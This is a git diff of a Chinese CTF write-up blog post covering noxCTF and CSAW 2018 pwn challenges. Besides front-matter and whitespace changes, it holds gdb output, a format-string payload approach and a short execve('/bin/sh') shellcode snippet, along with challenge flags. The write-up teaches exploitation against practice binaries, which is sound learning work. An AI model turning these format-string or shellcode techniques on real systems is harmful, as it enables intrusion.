@@ -1,14 +1,18 @@
 ---
-layout: post
-title:  "nox_CSAW部分pwn题解"
-date:   2018-10-09 18:00:00
-categories: WriteUp
-tags: WriteUp PWN nox CSAW
+title: nox_CSAW部分pwn题解
+author: nepire
+avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
+authorLink: 'https://nepire.github.io/'
+authorAbout: 逐梦者
+authorDesc: 逐梦者
+categories: 技术
+comments: true
+date: 2019-11-05 11:46:18
+tags:
+keywords:
+description:
+photos:
 ---
-
-* content
-{:toc}
-
 暑假的时候遇到了一群一起学习安全的小伙伴，在他们的诱劝下，开始接触国外的CTF比赛，作为最菜的pwn选手就试着先打两场比赛试试水，结果发现国外比赛真有意思哎嘿。
 
 本文首发于[安恒网络空间安全讲武堂](https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247485613&idx=1&sn=d523230fb3778620baaddaf987b7d7f3&chksm=fbf792ddcc801bcb81ffd41bc211bdd74c91cb80baecaaec5cb37b682b7afe3bf29dcb2f72d6&mpshare=1&scene=23&srcid=1009d0fGRYWnkyimpbjdG7sm#)
@@ -25,9 +29,9 @@ tags: WriteUp PWN nox CSAW
 
 惯例先走一遍file+checksec检查
 ```bash
-➜  believeMe file believeMe 
+➜  believeMe file believeMe
 believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped
-➜  believeMe checksec believeMe 
+➜  believeMe checksec believeMe
 [*] '/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -39,9 +43,9 @@ believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically
 再简单的运行下程序看看程序是什么样的结构
 
 ```bash
-➜  believeMe ./believeMe 
+➜  believeMe ./believeMe
 Someone told me that pwning makes noxāle...
-But......... how ???? 
+But......... how ????
 aaaa
 aaaa%  
 ➜  believeMe
@@ -59,12 +63,12 @@ aaaa%
 这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9
 
 ```bash
-➜  believeMe ./believeMe 
+➜  believeMe ./believeMe
 Someone told me that pwning makes noxāle...
-But......... how ???? 
+But......... how ????
 aaaa%9$x
 aaaa61616161%                                                         
-➜  believeMe 
+➜  believeMe
 ```
 
 然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40
@@ -111,34 +115,34 @@ gdb-peda$ stack 30
 0000| 0xffffcf1c --> 0x80487d8 (<main+129>:	add    esp,0x10)
 0004| 0xffffcf20 --> 0xffffcf44 ("aaaa%21$x")
 0008| 0xffffcf24 --> 0x804890c --> 0xa ('\n')
-0012| 0xffffcf28 --> 0xf7fb45a0 --> 0xfbad2288 
-0016| 0xffffcf2c --> 0x8f17 
-0020| 0xffffcf30 --> 0xffffffff 
+0012| 0xffffcf28 --> 0xf7fb45a0 --> 0xfbad2288
+0016| 0xffffcf2c --> 0x8f17
+0020| 0xffffcf30 --> 0xffffffff
 0024| 0xffffcf34 --> 0x2f ('/')
 0028| 0xffffcf38 --> 0xf7e0edc8 --> 0x2b76 ('v+')
 0032| 0xffffcf3c --> 0xffffd024 --> 0xffffd201 ("/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe")
-0036| 0xffffcf40 --> 0x8000 
+0036| 0xffffcf40 --> 0x8000
 0040| 0xffffcf44 ("aaaa%21$x")
 0044| 0xffffcf48 ("%21$x")
-0048| 0xffffcf4c --> 0xf7000078 
-0052| 0xffffcf50 --> 0x1 
-0056| 0xffffcf54 --> 0x0 
+0048| 0xffffcf4c --> 0xf7000078
+0052| 0xffffcf50 --> 0x1
+0056| 0xffffcf54 --> 0x0
 0060| 0xffffcf58 --> 0xf7e30a50 (<__new_exitfn+16>:	add    ebx,0x1835b0)
 0064| 0xffffcf5c --> 0x804885b (<__libc_csu_init+75>:	add    edi,0x1)
-0068| 0xffffcf60 --> 0x1 
+0068| 0xffffcf60 --> 0x1
 0072| 0xffffcf64 --> 0xffffd024 --> 0xffffd201 ("/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe")
 0076| 0xffffcf68 --> 0xffffd02c --> 0xffffd239 ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
-0080| 0xffffcf6c --> 0xed1acd00 
-0084| 0xffffcf70 --> 0xf7fb43dc --> 0xf7fb51e0 --> 0x0 
-0088| 0xffffcf74 --> 0xffffcf90 --> 0x1 
-0092| 0xffffcf78 --> 0x0 
+0080| 0xffffcf6c --> 0xed1acd00
+0084| 0xffffcf70 --> 0xf7fb43dc --> 0xf7fb51e0 --> 0x0
+0088| 0xffffcf74 --> 0xffffcf90 --> 0x1
+0092| 0xffffcf78 --> 0x0
 0096| 0xffffcf7c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
 --More--(25/30)
-0100| 0xffffcf80 --> 0xf7fb4000 --> 0x1b1db0 
-0104| 0xffffcf84 --> 0xf7fb4000 --> 0x1b1db0 
-0108| 0xffffcf88 --> 0x0 
+0100| 0xffffcf80 --> 0xf7fb4000 --> 0x1b1db0
+0104| 0xffffcf84 --> 0xf7fb4000 --> 0x1b1db0
+0108| 0xffffcf88 --> 0x0
 0112| 0xffffcf8c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
-0116| 0xffffcf90 --> 0x1 
+0116| 0xffffcf90 --> 0x1
 ```
 
 我们可以看到在偏移112处return地址为0xFFFFCF8C，我们找到了一个与它偏移相近的并且能被泄露出来的地址，因为题目说了(No ASLR) ，所以return的地址是不会变化，我们可以先连上一次得到return地址构造payload来getflag
@@ -172,9 +176,9 @@ noxCTF{N3ver_7rust_4h3_F0rmat}
 惯例检查一遍文件
 
 ```bash
-➜  TheNameCalculator file TheNameCalculator 
+➜  TheNameCalculator file TheNameCalculator
 TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f717904e2313e4d6c3bc92730d2e475861123dd, not stripped
-➜  TheNameCalculator checksec TheNameCalculator 
+➜  TheNameCalculator checksec TheNameCalculator
 [*] '/home/Ep3ius/pwn/process/noxCTF2018/TheNameCalculator/TheNameCalculator'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -186,9 +190,9 @@ TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dyn
 简单过一遍程序，只有一个输入
 
 ```bash
-➜  TheNameCalculator ./TheNameCalculator 
+➜  TheNameCalculator ./TheNameCalculator
 What is your name?
-Ep3ius 
+Ep3ius
 I've heard better
 ```
 
@@ -282,9 +286,9 @@ noxCTF{M1nd_7he_Input}
 简单的bof类型题目，先检查文件
 
 ```bash
-➜  bigboy file boi 
+➜  bigboy file boi
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
-➜  bigboy checksec boi 
+➜  bigboy checksec boi
 [*] '/home/Ep3ius/pwn/process/CSAW2018/bigboy/boi'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -333,13 +337,13 @@ int __cdecl main(int argc, const char **argv, const char **envp)
    0x4006b9 <main+120>: jmp    0x4006c5 <main+132>
 [------------------------------------stack-------------------------------------]
 0000| 0x7ffd1313f360 --> 0x7ffd1313f488 --> 0x7ffd131402a8 --> 0x545100696f622f2e ('./boi')
-0008| 0x7ffd1313f368 --> 0x10040072d 
+0008| 0x7ffd1313f368 --> 0x10040072d
 0016| 0x7ffd1313f370 ('a' <repeats 16 times>, "\356\272\363\312\n\276\255", <incomplete sequence \336>)
 0024| 0x7ffd1313f378 ("aaaaaaaa\356\272\363\312\n\276\255", <incomplete sequence \336>)
-0032| 0x7ffd1313f380 --> 0xdeadbe0acaf3baee 
-0040| 0x7ffd1313f388 --> 0x0 
-0048| 0x7ffd1313f390 --> 0x7ffd1313f480 --> 0x1 
-0056| 0x7ffd1313f398 --> 0xcc79c30a8da0b800 
+0032| 0x7ffd1313f380 --> 0xdeadbe0acaf3baee
+0040| 0x7ffd1313f388 --> 0x0
+0048| 0x7ffd1313f390 --> 0x7ffd1313f480 --> 0x1
+0056| 0x7ffd1313f398 --> 0xcc79c30a8da0b800
 [------------------------------------------------------------------------------] blue
 Legend: code, data, rodata, value
 0x00000000004006a8 in main ()
@@ -393,9 +397,9 @@ flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
 #### PWN—get it
 
 ```bash
-➜  get_it file get_it 
+➜  get_it file get_it
 get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
-➜  get_it checksec get_it 
+➜  get_it checksec get_it
 [*] '/home/Ep3ius/pwn/process/CSAW2018/get_it/get_it'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -435,9 +439,9 @@ flag{y0u_deF_get_itls}
 #### PWN—shell->code
 
 ```bash
-➜  shellpointcode file shellpointcode 
+➜  shellpointcode file shellpointcode
 shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
-➜  shellpointcode checksec shellpointcode 
+➜  shellpointcode checksec shellpointcode
 [*] '/home/Ep3ius/pwn/process/CSAW2018/shellpointcode/shellpointcode'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -450,15 +454,15 @@ shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamica
 很明显的让你写shellcode的题目，简单的审计和运行过一遍程序后发现他是一个有两个节点链表结构，并且每个节点输入最多为15byte，并且在node.next泄露出了栈上的地址，对于完整shellcode来说15字节一般是不够的
 
 ```bash
-➜  shellpointcode ./shellpointcode 
-Linked lists are great! 
+➜  shellpointcode ./shellpointcode
+Linked lists are great!
 They let you chain pieces of data together.
 
 (15 bytes) Text for node 1:  
 aaaa
-(15 bytes) Text for node 2: 
+(15 bytes) Text for node 2:
 bbbb
-node1: 
+node1:
 node.next: 0x7ffd53539c70
 node.buffer: aaaa
 
@@ -471,22 +475,22 @@ Thanks 111
 
 ```bash
 [----------------------------------registers-----------------------------------]
-RAX: 0x19 
-RBX: 0x0 
+RAX: 0x19
+RBX: 0x0
 RCX: 0x7f1f405832c0 (<__write_nocancel+7>:  cmp    rax,0xfffffffffffff001)
-RDX: 0x7f1f40852780 --> 0x0 
+RDX: 0x7f1f40852780 --> 0x0
 RSI: 0x7ffea8fdff90 ("Thanks ", 'a' <repeats 11 times>, "h&\376\250\376\177\n\nnode.buffer: H\211\347j;X1\366\231\017\005\n\n")
-RDI: 0x1 
+RDI: 0x1
 RBP: 0x6161616161616161 ('aaaaaaaa')
-RSP: 0x7ffea8fe2638 --> 0x7ffea8fe2668 --> 0xf631583b6ae78948 
+RSP: 0x7ffea8fe2638 --> 0x7ffea8fe2668 --> 0xf631583b6ae78948
 RIP: 0x55d7207d08ee (ret)
 R8 : 0x7f1f40a5e700 (0x00007f1f40a5e700)
-R9 : 0x19 
-R10: 0x11 
-R11: 0x246 
+R9 : 0x19
+R10: 0x11
+R11: 0x246
 R12: 0x55d7207d0720 (xor    ebp,ebp)
-R13: 0x7ffea8fe2770 --> 0x1 
-R14: 0x0 
+R13: 0x7ffea8fe2770 --> 0x1
+R14: 0x0
 R15: 0x0
 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
@@ -499,14 +503,14 @@ EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
    0x55d7207d08f3:  sub    rsp,0x40
    0x55d7207d08f7:  lea    rax,[rbp-0x40]
 [------------------------------------stack-------------------------------------]
-0000| 0x7ffea8fe2638 --> 0x7ffea8fe2668 --> 0xf631583b6ae78948 
+0000| 0x7ffea8fe2638 --> 0x7ffea8fe2668 --> 0xf631583b6ae78948
 0008| 0x7ffea8fe2640 --> 0x68732f6e69622f ('/bin/sh')
 0016| 0x7ffea8fe2648 --> 0xa ('\n')
-0024| 0x7ffea8fe2650 --> 0x0 
-0032| 0x7ffea8fe2658 --> 0x7f1f40851620 --> 0xfbad2887 
+0024| 0x7ffea8fe2650 --> 0x0
+0032| 0x7ffea8fe2658 --> 0x7f1f40851620 --> 0xfbad2887
 0040| 0x7ffea8fe2660 --> 0x7ffea8fe2640 --> 0x68732f6e69622f ('/bin/sh')
-0048| 0x7ffea8fe2668 --> 0xf631583b6ae78948 
-0056| 0x7ffea8fe2670 --> 0xa050f99 
+0048| 0x7ffea8fe2668 --> 0xf631583b6ae78948
+0056| 0x7ffea8fe2670 --> 0xa050f99
 [------------------------------------------------------------------------------] blue
 Legend: code, data, rodata, value
 0x000055d7207d08ee in ?? ()
@@ -525,7 +529,7 @@ shellcode ="""
     mov rdi, rsp      /* call execve('rsp',0,0) rsp->'/bin/sh\0' */
     push 0x3b         /* sys_execve */
     pop rax
-    xor esi,esi 
+    xor esi,esi
     syscall
 """
 #print len(asm(shellcode))
@@ -546,4 +550,3 @@ FLAG
 ```
 flag{NONONODE_YOU_WRECKED_BRO}
 ```
-
